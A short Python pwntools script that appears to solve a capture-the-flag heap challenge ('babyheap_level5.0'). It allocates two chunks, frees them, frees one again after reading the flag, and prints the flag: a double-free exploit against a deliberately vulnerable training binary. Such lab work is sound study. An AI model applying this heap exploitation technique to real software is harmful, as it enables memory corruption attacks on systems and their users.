# Nagib Lakhdari 3si2
from pwn import *

# Start the process for the challenge binary
p = process("/challenge/babyheap_level5.0")

# Send commands to the process
p.sendline(b'malloc')      # Allocate memory
p.sendline(b'0')           # Index for the first memory allocation
p.sendline(b'424')         # Size of the first memory allocation
p.sendline(b'malloc')      # Allocate another memory block
p.sendline(b'1')           # Index for the second memory allocation
p.sendline(b'424')         # Size of the second memory allocation
p.sendline(b'free')        # Free the first allocated memory block
p.sendline(b'0')           # Index of the first memory block
p.sendline(b'free')        # Free the second allocated memory block
p.sendline(b'1')           # Index of the second memory block
p.sendline(b'read_flag')   # Read the flag
p.sendline(b'free')        # Free the second memory block again
p.sendline(b'1')           # Index of the second memory block
p.sendline(b'puts_flag')   # Print the flag

# Interact with the process to get the output
p.interactive()
